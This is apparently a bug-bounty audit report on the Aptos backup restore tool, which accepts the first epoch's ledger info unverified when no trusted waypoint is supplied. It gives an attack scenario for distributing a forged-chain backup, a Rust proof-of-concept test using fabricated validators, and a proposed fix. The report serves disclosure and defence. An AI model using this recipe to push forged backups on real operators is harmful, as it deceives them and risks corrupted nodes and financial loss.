# Audit Report

## Title
Missing Cryptographic Verification of First Epoch in Backup Restore Allows Malicious Chain Acceptance

## Summary
The `preheat_impl()` function in the epoch ending restore process fails to cryptographically verify the first ledger info when no trusted waypoint is provided and no previous ledger info exists. This allows an attacker to create a completely fabricated blockchain fork from genesis, and if an operator performs a restore without providing trusted waypoints (the default configuration), the malicious chain will be accepted without signature verification. [1](#0-0) 

## Finding Description
The waypoint chain validation logic in `EpochEndingRestoreController::preheat_impl()` contains a critical gap that breaks the **State Consistency** invariant. The validation follows this pattern: [2](#0-1) 

For each ledger info, the code checks:
1. If a trusted waypoint exists for that version → verify against waypoint (hash check only, no signatures)
2. Else if previous ledger info exists → verify signatures using previous epoch's validator set
3. **If neither condition is met → NO VERIFICATION OCCURS**

For the first ledger info in a restore operation, `previous_li` is initialized as `None`, and if the operator hasn't provided a trusted waypoint (which is **optional** and defaults to an empty list), the first epoch is accepted without any cryptographic proof of authenticity. [3](#0-2) 

The Helm chart configuration shows that `trusted_waypoints` defaults to an empty array, and the restore command iterates over this list: [4](#0-3) 

**Attack Scenario:**
1. Attacker creates a malicious fork starting from epoch 0 with fabricated validators
2. Each subsequent epoch is properly signed by the previous epoch's malicious validator set (valid internal chain)
3. Waypoints are correctly computed as hashes of the malicious ledger infos
4. The manifest passes structural validation in `EpochEndingBackup::verify()`
5. Attacker distributes this backup (via compromised storage, social engineering, etc.)
6. Operator performs restore without providing trusted waypoints
7. The first ledger info (epoch 0) passes through without verification
8. All subsequent epochs verify correctly against the malicious first epoch
9. Result: Node is restored with completely fabricated state on a fake chain [5](#0-4) 

The manifest verification only checks structural consistency (epoch ranges, chunk continuity) but does not validate the authenticity of the waypoints themselves.

## Impact Explanation
This vulnerability represents a **High Severity** issue according to Aptos bug bounty criteria:

1. **Significant Protocol Violation**: The fundamental assumption that restored nodes contain valid, authenticated blockchain state is violated. A node restored from a malicious backup operates on an entirely fabricated reality.

2. **State Inconsistencies Requiring Intervention**: The restored node will have:
   - Fabricated transaction history
   - Fake account balances and smart contract state
   - Invalid validator set from the malicious fork
   - Incorrect consensus parameters

3. **Operational Impact**: 
   - If the compromised node is used for transaction validation, it will produce incorrect results
   - If used in a validator set, it cannot participate in consensus with legitimate nodes
   - Discovery requires manual intervention and complete re-restore with trusted waypoints
   - Potential for fund loss if the node is used for financial operations before the compromise is detected

While the node will eventually fail to sync with the legitimate network (as it's on a different fork), the damage occurs during the window between restore and discovery, especially for operators who may not immediately notice sync failures in automated deployments.

## Likelihood Explanation
**Likelihood: Medium-High**

**Factors Increasing Likelihood:**
1. **Default Configuration is Vulnerable**: The default `trusted_waypoints: []` means operators must explicitly opt-in to security rather than opt-out
2. **Operational Complexity**: Setting up trusted waypoints requires operators to obtain and verify canonical waypoints, adding friction that may be skipped
3. **Multiple Attack Vectors**: 
   - Compromise of backup storage location
   - Man-in-the-middle during backup download
   - Social engineering to convince operators to use "faster" backup sources
   - Supply chain attacks on backup distribution

**Factors Decreasing Likelihood:**
1. **Requires Operator Action**: Attack requires the operator to perform a restore operation
2. **Post-Restore Detection**: The node will fail to sync with legitimate nodes, potentially alerting operators
3. **Best Practice Documentation**: Operators following security best practices should use trusted waypoints

The test suite demonstrates this is by design - the system is intentionally built to work without trusted waypoints when signatures are valid: [6](#0-5) 

This design choice, while convenient for testing and trusted backup sources, creates a security gap for production deployments.

## Recommendation

**Immediate Fix**: Require at least one trusted waypoint (typically genesis waypoint) for any epoch ending restore that starts from epoch 0. This enforces defense-in-depth even when the backup source should be trusted.

**Code Fix** in `storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs`:

```rust
async fn preheat_impl(&self) -> Result<EpochEndingRestorePreheatData> {
    let manifest: EpochEndingBackup =
        self.storage.load_json_file(&self.manifest_handle).await?;
    manifest.verify()?;

    let mut next_epoch = manifest.first_epoch;
    let mut waypoint_iter = manifest.waypoints.iter();

    let mut previous_li: Option<&LedgerInfoWithSignatures> = None;
    let mut ledger_infos = Vec::new();

    let mut past_target = false;
    for chunk in &manifest.chunks {
        if past_target {
            break;
        }

        let lis = self.read_chunk(&chunk.ledger_infos).await?;
        ensure!(
            chunk.first_epoch + lis.len() as u64 == chunk.last_epoch + 1,
            "Number of items in chunks doesn't match that in manifest. \
            first_epoch: {}, last_epoch: {}, items in chunk: {}",
            chunk.first_epoch,
            chunk.last_epoch,
            lis.len(),
        );

        for li in lis {
            if li.ledger_info().version() > self.target_version {
                past_target = true;
                break;
            }

            ensure!(
                li.ledger_info().epoch() == next_epoch,
                "LedgerInfo epoch not expected. Expected: {}, actual: {}.",
                li.ledger_info().epoch(),
                next_epoch,
            );
            let wp_manifest = waypoint_iter.next().ok_or_else(|| {
                anyhow!("More LedgerInfo's found than waypoints in manifest.")
            })?;
            let wp_li = Waypoint::new_epoch_boundary(li.ledger_info())?;
            ensure!(
                *wp_manifest == wp_li,
                "Waypoints don't match. In manifest: {}, In chunk: {}",
                wp_manifest,
                wp_li,
            );
            
            // NEW VALIDATION: Require trusted waypoint or previous LI for verification
            if let Some(wp_trusted) = self.trusted_waypoints.get(&wp_li.version()) {
                ensure!(
                    *wp_trusted == wp_li,
                    "Waypoints don't match. In backup: {}, trusted: {}",
                    wp_li,
                    wp_trusted,
                );
            } else if let Some(pre_li) = previous_li {
                pre_li
                    .ledger_info()
                    .next_epoch_state()
                    .ok_or_else(|| {
                        anyhow!(
                            "Next epoch state not found from LI at epoch {}.",
                            pre_li.ledger_info().epoch()
                        )
                    })?
                    .verify(&li)?;
            } else {
                // NEW: Fail if no trusted waypoint and no previous LI
                return Err(anyhow!(
                    "No trusted waypoint provided for epoch {} and no previous epoch to verify against. \
                    Cannot cryptographically verify this ledger info. Please provide a trusted waypoint \
                    for at least the first epoch (genesis) using --trust-waypoint",
                    next_epoch
                ));
            }
            
            ledger_infos.push(li);
            previous_li = ledger_infos.last();
            next_epoch += 1;
        }
    }

    Ok(EpochEndingRestorePreheatData {
        manifest,
        ledger_infos,
    })
}
```

**Additional Recommendations:**
1. Update documentation to strongly recommend always providing at least the genesis waypoint
2. Update Helm charts to include well-known network waypoints by default
3. Add warning logs when restore proceeds without any trusted waypoints
4. Consider adding a `--allow-unverified-genesis` flag for testing scenarios where this is intentional

## Proof of Concept

```rust
// PoC demonstrating the vulnerability
// This would be added as a test in storage/backup/backup-cli/src/backup_types/epoch_ending/tests.rs

#[tokio::test]
async fn test_malicious_genesis_without_waypoint() {
    use aptos_types::{
        aggregate_signature::AggregateSignature,
        validator_verifier::random_validator_verifier,
        block_info::BlockInfo,
        ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
        epoch_state::EpochState,
    };
    use aptos_crypto::hash::HashValue;
    use std::sync::Arc;
    
    // Create a MALICIOUS genesis with fake validators
    let (fake_signers, fake_verifier) = random_validator_verifier(3, None, true);
    let fake_verifier = Arc::new(fake_verifier);
    
    // Create fake epoch 0 ledger info with malicious validator set for epoch 1
    let (next_signers, next_verifier) = random_validator_verifier(3, None, true);
    let next_verifier = Arc::new(next_verifier);
    let epoch_state = EpochState {
        epoch: 1,
        verifier: next_verifier.clone(),
    };
    
    let fake_genesis_li = LedgerInfo::new(
        BlockInfo::new(
            0, // epoch
            0,
            HashValue::zero(),
            HashValue::zero(),
            0, // version
            0,
            Some(epoch_state),
        ),
        HashValue::zero(),
    );
    
    // Sign with fake validators
    let partial_sigs = PartialSignatures::new(
        fake_signers
            .iter()
            .map(|s| (s.author(), s.sign(&fake_genesis_li).unwrap()))
            .collect(),
    );
    let agg_sig = fake_verifier
        .aggregate_signatures(partial_sigs.signatures_iter())
        .unwrap();
    
    let fake_genesis = LedgerInfoWithSignatures::new(fake_genesis_li, agg_sig);
    
    // Create backup with this malicious genesis
    let backup_dir = TempPath::new();
    backup_dir.create_as_dir().unwrap();
    let store: Arc<dyn BackupStorage> = Arc::new(LocalFs::new(backup_dir.path().to_path_buf()));
    
    // Mock backup service returns our malicious genesis
    let port = mock_backup_service_get_epoch_ending_lis(vec![fake_genesis]).await;
    let client = Arc::new(BackupServiceClient::new(format!(
        "http://localhost:{}",
        port
    )));
    
    // Create backup manifest
    let manifest = EpochEndingBackupController::new(
        EpochEndingBackupOpt {
            start_epoch: 0,
            end_epoch: 1,
        },
        GlobalBackupOpt {
            max_chunk_size: 1024,
            concurrent_data_requests: 2,
        },
        client,
        Arc::clone(&store),
    )
    .run()
    .await
    .unwrap();
    
    // Attempt restore WITHOUT trusted waypoints
    let result = EpochHistoryRestoreController::new(
        vec![manifest],
        GlobalRestoreOpt {
            db_dir: None,
            dry_run: true,
            target_version: None,
            trusted_waypoints: TrustedWaypointOpt::default(), // NO TRUSTED WAYPOINTS
            rocksdb_opt: RocksdbOpt::default(),
            concurrent_downloads: ConcurrentDownloadsOpt::default(),
            replay_concurrency_level: ReplayConcurrencyLevelOpt::default(),
            enable_state_indices: false,
        }
        .try_into()
        .unwrap(),
        Arc::clone(&store),
    )
    .run()
    .await;
    
    // VULNERABILITY: This succeeds even though genesis is completely fabricated
    // The malicious genesis is accepted without any verification
    assert!(result.is_ok(), "Restore should succeed without verification - this is the vulnerability!");
    
    // To fix: result should be Err due to missing trusted waypoint for genesis
    // Expected error: "No trusted waypoint provided for epoch 0 and no previous epoch to verify against"
}
```

The PoC demonstrates that a completely fabricated genesis ledger info signed by arbitrary fake validators will be accepted during restore if no trusted waypoint is provided, violating the fundamental security assumption that restored state must be cryptographically authenticated.

**Notes**

This vulnerability stems from an implicit trust assumption that backup sources are always authentic. While this may be true in controlled environments, defense-in-depth principles require cryptographic verification regardless of source trust. The waypoint mechanism exists precisely for this purpose, but making it optional for the first epoch creates a critical security gap. The fix is straightforward: require at least one trusted waypoint (typically genesis) to establish an authenticated chain root, then verify all subsequent epochs against this root.

### Citations

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L80-158)
```rust
    async fn preheat_impl(&self) -> Result<EpochEndingRestorePreheatData> {
        let manifest: EpochEndingBackup =
            self.storage.load_json_file(&self.manifest_handle).await?;
        manifest.verify()?;

        let mut next_epoch = manifest.first_epoch;
        let mut waypoint_iter = manifest.waypoints.iter();

        let mut previous_li: Option<&LedgerInfoWithSignatures> = None;
        let mut ledger_infos = Vec::new();

        let mut past_target = false;
        for chunk in &manifest.chunks {
            if past_target {
                break;
            }

            let lis = self.read_chunk(&chunk.ledger_infos).await?;
            ensure!(
                chunk.first_epoch + lis.len() as u64 == chunk.last_epoch + 1,
                "Number of items in chunks doesn't match that in manifest. \
                first_epoch: {}, last_epoch: {}, items in chunk: {}",
                chunk.first_epoch,
                chunk.last_epoch,
                lis.len(),
            );

            for li in lis {
                if li.ledger_info().version() > self.target_version {
                    past_target = true;
                    break;
                }

                ensure!(
                    li.ledger_info().epoch() == next_epoch,
                    "LedgerInfo epoch not expected. Expected: {}, actual: {}.",
                    li.ledger_info().epoch(),
                    next_epoch,
                );
                let wp_manifest = waypoint_iter.next().ok_or_else(|| {
                    anyhow!("More LedgerInfo's found than waypoints in manifest.")
                })?;
                let wp_li = Waypoint::new_epoch_boundary(li.ledger_info())?;
                ensure!(
                    *wp_manifest == wp_li,
                    "Waypoints don't match. In manifest: {}, In chunk: {}",
                    wp_manifest,
                    wp_li,
                );
                if let Some(wp_trusted) = self.trusted_waypoints.get(&wp_li.version()) {
                    ensure!(
                        *wp_trusted == wp_li,
                        "Waypoints don't match. In backup: {}, trusted: {}",
                        wp_li,
                        wp_trusted,
                    );
                } else if let Some(pre_li) = previous_li {
                    pre_li
                        .ledger_info()
                        .next_epoch_state()
                        .ok_or_else(|| {
                            anyhow!(
                                "Next epoch state not found from LI at epoch {}.",
                                pre_li.ledger_info().epoch()
                            )
                        })?
                        .verify(&li)?;
                }
                ledger_infos.push(li);
                previous_li = ledger_infos.last();
                next_epoch += 1;
            }
        }

        Ok(EpochEndingRestorePreheatData {
            manifest,
            ledger_infos,
        })
    }
```

**File:** terraform/helm/fullnode/values.yaml (L212-213)
```yaml
    # -- List of trusted waypoints for restore
    trusted_waypoints: []
```

**File:** terraform/helm/fullnode/templates/fullnode.yaml (L55-58)
```yaml
          /usr/local/bin/aptos-debugger aptos-db restore bootstrap-db \
            --concurrent-downloads {{ .config.concurrent_downloads }} \
            {{ range .config.trusted_waypoints }} --trust-waypoint {{ . }}{{ end }} \
            --target-db-dir /opt/aptos/data/db \
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/manifest.rs (L28-68)
```rust
impl EpochEndingBackup {
    pub fn verify(&self) -> Result<()> {
        // check number of waypoints
        ensure!(
            self.first_epoch <= self.last_epoch
                && self.last_epoch - self.first_epoch + 1 == self.waypoints.len() as u64,
            "Malformed manifest. first epoch: {}, last epoch {}, num waypoints {}",
            self.first_epoch,
            self.last_epoch,
            self.waypoints.len(),
        );

        // check chunk ranges
        ensure!(!self.chunks.is_empty(), "No chunks.");
        let mut next_epoch = self.first_epoch;
        for chunk in &self.chunks {
            ensure!(
                chunk.first_epoch == next_epoch,
                "Chunk ranges not continuous. Expected first epoch: {}, actual: {}.",
                next_epoch,
                chunk.first_epoch,
            );
            ensure!(
                chunk.last_epoch >= chunk.first_epoch,
                "Chunk range invalid. [{}, {}]",
                chunk.first_epoch,
                chunk.last_epoch,
            );
            next_epoch = chunk.last_epoch + 1;
        }

        // check last epoch in chunk matches manifest
        ensure!(
            next_epoch - 1 == self.last_epoch, // okay to -1 because chunks is not empty.
            "Last epoch in chunks: {}, in manifest: {}",
            next_epoch - 1,
            self.last_epoch,
        );

        Ok(())
    }
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/tests.rs (L214-232)
```rust
    let res_without_waypoints = EpochHistoryRestoreController::new(
        manifests.clone(),
        GlobalRestoreOpt {
            db_dir: None,
            dry_run: true,
            target_version: None,
            trusted_waypoints: TrustedWaypointOpt::default(),
            rocksdb_opt: RocksdbOpt::default(),
            concurrent_downloads: ConcurrentDownloadsOpt::default(),
            replay_concurrency_level: ReplayConcurrencyLevelOpt::default(),
            enable_state_indices: false,
        }
        .try_into()
        .unwrap(),
        Arc::clone(&store),
    )
    .run()
    .await;
    assert_eq!(should_fail_without, res_without_waypoints.is_err());
```
